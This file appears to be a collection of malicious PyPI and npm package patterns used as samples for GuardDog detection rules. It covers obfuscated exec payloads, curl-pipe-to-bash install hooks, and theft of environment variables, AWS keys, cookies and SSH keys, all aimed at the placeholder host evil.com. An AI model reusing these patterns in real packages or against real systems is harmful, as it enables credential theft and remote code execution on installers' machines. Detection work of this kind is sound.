# Supply Chain Attack Patterns from DataDog GuardDog
# Source: https://github.com/DataDog/guarddog
# License: Apache-2.0
# These patterns are found in malicious PyPI/npm packages

# =============================================================================
# Category: setup.py Code Execution (code-execution.yml)
# Severity: 9 - Direct code execution during package installation
# =============================================================================

# Pattern: subprocess.Popen in setup.py
import subprocess
subprocess.Popen(['curl', 'https://evil.com/payload.sh', '|', 'bash'], shell=True)

# Pattern: os.system in setup.py
import os
os.system('curl https://evil.com/install.sh | bash')

# Pattern: eval with remote code
import urllib.request
eval(urllib.request.urlopen('https://evil.com/code.py').read())

# Pattern: exec with obfuscated string
exec(__import__('base64').b64decode('Y3VybCBodHRwczovL2V2aWwuY29tL3BheWxvYWQuc2ggfCBiYXNo'))

# =============================================================================
# Category: Base64 Obfuscated Execution (exec-base64.yml)
# Severity: 8 - Obfuscated payload execution
# =============================================================================

# Pattern: base64 decode to exec
import base64
exec(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgZXZpbC5jb20gfCBiYXNoJyk='))

# Pattern: marshal/zlib decompression execution
import marshal, zlib
exec(marshal.loads(zlib.decompress(b'x\x9c...')))

# Pattern: dynamic import with base64
__import__('os').system(__import__('base64').b64decode('Y3VybCBldmlsLmNvbSB8IGJhc2g=').decode())

# =============================================================================
# Category: Data Exfiltration (exfiltrate-sensitive-data.yml)
# Severity: 9 - Credential theft and exfiltration
# =============================================================================

# Pattern: Environment variable exfiltration
import os, requests
requests.post('https://evil.com/collect', data={'env': str(os.environ)})

# Pattern: AWS credential theft
import os, urllib.request
aws_key = os.getenv('AWS_ACCESS_KEY_ID')
aws_secret = os.getenv('AWS_SECRET_ACCESS_KEY')
urllib.request.urlopen(f'https://evil.com/aws?key={aws_key}&secret={aws_secret}')

# Pattern: Browser cookie theft
import browser_cookie3, requests
cookies = browser_cookie3.chrome()
requests.post('https://evil.com/cookies', data={'c': str(list(cookies))})

# Pattern: SSH key exfiltration via socket
import socket, os
s = socket.socket()
s.connect(('evil.com', 4444))
s.send(open(os.path.expanduser('~/.ssh/id_rsa')).read().encode())

# =============================================================================
# Category: npm Install Script Attacks (npm-install-script.yml)
# Severity: 8 - Post-install hooks executing malicious code
# =============================================================================

# package.json postinstall pattern
{"scripts": {"postinstall": "curl https://evil.com/payload.sh | bash"}}

# preinstall with node execution
{"scripts": {"preinstall": "node -e \"require('child_process').exec('curl evil.com|sh')\""}}

# =============================================================================
# Category: Silent Process Execution
# Severity: 7 - Hidden command execution
# =============================================================================

# Pattern: subprocess with hidden window
import subprocess
subprocess.Popen(['powershell', '-WindowStyle', 'Hidden', '-Command', 'curl evil.com|iex'], creationflags=0x08000000)

# Pattern: nohup background execution
os.system('nohup curl https://evil.com/backdoor.sh | bash &>/dev/null &')

# =============================================================================
# Category: Download and Execute
# Severity: 9 - Remote binary execution
# =============================================================================

# Pattern: Download executable and run
import urllib.request, os, stat
urllib.request.urlretrieve('https://evil.com/malware', '/tmp/m')
os.chmod('/tmp/m', stat.S_IXUSR)
os.system('/tmp/m')

# Pattern: Memory-only execution (fileless)
import urllib.request
exec(urllib.request.urlopen('https://evil.com/payload.py').read())
